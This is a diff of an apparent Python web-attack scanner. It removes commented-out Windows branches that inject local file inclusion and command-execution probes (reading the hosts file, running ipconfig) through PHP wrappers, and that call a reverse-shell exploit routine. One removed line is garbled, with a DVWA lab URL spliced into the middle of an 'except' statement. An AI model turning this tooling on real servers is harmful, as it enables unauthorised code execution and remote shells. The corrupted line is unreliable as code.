@@ -230,24 +230,6 @@ def test_php_filter(url):
             #TODO
             pass
 
-        
-    #Windows
-    #for i in range(len(testW)):
-    #    u = url.replace(args.param, testW[i])
-    #    
-    #    try:
-    #        res = requests.get(u, headers = headers, proxies = proxies)
-    #        if(checkPayload(res)):
-    #            tempUrl = u.replace("C:/Windows/System32/drivers/etc/hosts", 'CMD')
-    #            getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'FILTER', 'WINDOWS')
-    #            print("[+] LFI -> " + u)
-    #            
-    #            if(args.no_stop):
-    #                continue
-    #            else: break
-    #    except Exception as e:
-    #        print("Unknown problem occurred: ")
-
 
 def test_php_data(url):
     if(args.verbose):
@@ -271,29 +253,6 @@ def test_php_data(url):
         except Exception as e:
             #TODO
             pass
-
-
-    #Windows
-    #for i in range(len(testW)):
-    #    if(args.param in url):
-    #        u = url.replace(args.param, testW[i])
-    #    try:
-    #        res = requests.get(u, headers = headers, proxies = proxies)
-    #    
-    #        if(checkPayload(res)):
-    #            tempUrl = u.replace('ipconfig', 'CMD')
-    #            getExploit(res, 'GET', 'RCE', tempUrl, '', headers, 'DATA', 'WINDOWS')
-    #            print("[+] RCE -> " + u)
-    #            if(args.no_stop):
-    #                continue
-    #            else: break
-    #    
-    #    excehttp://192.168.203.141/dvwa/vulnerabilities/fi/?page=include.phppt Exception as e:
-    #        print("Unknown problem occurred: ")
-    #
-    # if(args.revshell):
-    #     exploit(exploits, 'DATA')
-
 
 def test_php_input(url):
     if(args.verbose):
@@ -325,31 +284,6 @@ def test_php_input(url):
             except Exception as e:
                 #TODO
                 pass
-            
-
-    #if(os != 'LINUX'):
-    #    #Windows
-    #    for k in range(len(testW)):
-    #        if(args.param in url):
-    #            u = url.replace(args.param, testW[k])
-    #    
-    #
-    #    #for l in range(len(posts)):
-    #            try:
-    #                res = requests.post(u, headers = headers, data = posts[l], proxies = proxies)
-    #                
-    #                if(checkPayload(res)):
-    #                    tempUrl = u.replace('ipconfig', 'CMD')
-    #                    getExploit(res, 'POST', 'RCE', tempUrl, posts[l], headers, 'INPUT', 'WINDOWS')
-    #                    print("[+] RCE -> " + u + " -> HTTP POST: " + posts[l])
-    #                    break
-    #            
-    #            except Exception as e: 
-    #                print("Unknown problem occurred: ")
-    #
-    #if(args.revshell):
-    #    exploit(exploits, 'INPUT')
-
 
 def test_php_expect(url):
     if(args.verbose):
@@ -378,28 +312,6 @@ def test_php_expect(url):
         
         except Exception as e:
             print("Unknown problem occured: ")
-
-
-    ##Windows
-    #for j in range(len(testW)):
-    #    if(args.param in url):
-    #        u = url.replace(args.param, testW[j])
-    #    
-    #    try:
-    #        res = requests.get(u, headers = headers, proxies = proxies)
-    #        
-    #        if(checkPayload(res)):
-    #            tempUrl = u.replace('ipconfig', 'CMD')
-    #            getExploit(res, 'GET', 'RCE', tempUrl, testW[j], headers, 'EXPECT', 'WINDOWS')
-    #            print("[+] RCE -> " + u)
-    #            break
-    #    
-    #    except Exception as e:
-    #        print("Unknown problem ocurred: ")
-    #    
-    #
-    #if(args.revshell):
-    #   exploit(exploits, 'EXPECT')
 
 def test_rfi(url):
     if(args.verbose):
